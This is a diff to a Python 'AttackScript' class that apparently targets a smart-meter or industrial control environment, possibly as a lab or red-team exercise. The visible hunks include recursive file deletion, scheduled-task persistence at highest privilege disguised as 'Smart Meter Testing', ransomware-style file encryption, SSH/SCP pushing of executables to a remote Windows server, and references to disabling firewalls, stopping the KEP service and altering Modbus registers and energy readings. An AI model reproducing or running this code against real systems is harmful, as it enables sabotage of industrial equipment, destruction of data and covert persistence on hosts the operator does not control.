@@ -145,13 +145,12 @@ class AttackScript:
             folder_path (str):
         """
         ip_addrs_in_system: list[str] = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]
-
         # If the thing is ran locally
         if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
             for root, dirs, files in walk(folder_path):
                 for file in files:
                     og = path.join(root, file)
-                    dest = path.join(self.COPIED_PATH, file)
+                    #dest = path.join(self.COPIED_PATH, file)
                     remove(og)
                     print("File: " + str(og) + " is deleted")
         
@@ -175,6 +174,7 @@ class AttackScript:
             # TODO: Run a native command prompt with task scheduler without cmd window appearing
             # task_name3 = 'Smart Meter Testing 3' # Be even more annoying and run the command locally to delete
 
+            #sch1 = f'schtasks /create /tn "{task_name1}" /tr "cmd /c \"{executable_file_path} {executable_file_parameters}\"" /sc minute /mo 1 /f /rl HIGHEST'
             sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
             sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
             # TODO: Test if the task scheduler works.
@@ -182,8 +182,6 @@ class AttackScript:
             command_output_2 = self.ssh_run_command(sch2)
             print(command_output_1); print(command_output_2)
             print("\nOk.\n")
-
-
 
     def create_scheduled_task(self) -> None:
         """
@@ -430,7 +428,6 @@ class AttackScript:
             [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
         remove(dataFile)
 
-
     def recurseFiles(self,baseDirectory):
         #Scan a directory and return a list of all files
         for entry in scandir(baseDirectory):
@@ -489,7 +486,6 @@ class AttackScript:
         self.kep_server_start()
 
         print("\nOk.\n")
-
 
     def clear_energy_reading(self) -> None:
         """
@@ -645,8 +641,6 @@ class AttackScript:
 
         return
             
-
-
     # TODO: REVERT THIS THING PAIN.
     def revert(self,revert_option):
         # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
@@ -1377,7 +1371,6 @@ class AttackScript:
         print(results)
         return results
     
-
     def scp_transfer_file(self, local_full_path: str, remote_full_path: str) -> None:
         """
         # TODO: from self.ssh_run_command, uses the same ssh paramiko client. May need to cut the paramiko client connection to its own function, then both self.scp_transfer_file and self.ssh_run_command can use the same ssh paramiko client function
@@ -1457,8 +1450,12 @@ class AttackScript:
 
         if remote_path is None:
             remote_path = self.MODPOLL_PATH
+            remote_path = path.normpath(remote_path)
 
-        self.scp_transfer_file(f"dist/{executable_name}", f"{remote_path}/{executable_name}")
+        remote_full_path = path.join(remote_path, executable_name).replace("\\", "/")
+
+        print(f"Path name is {remote_path}\\{executable_name}")
+        self.scp_transfer_file(f"dist/{executable_name}", remote_full_path)
 
         #print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
     
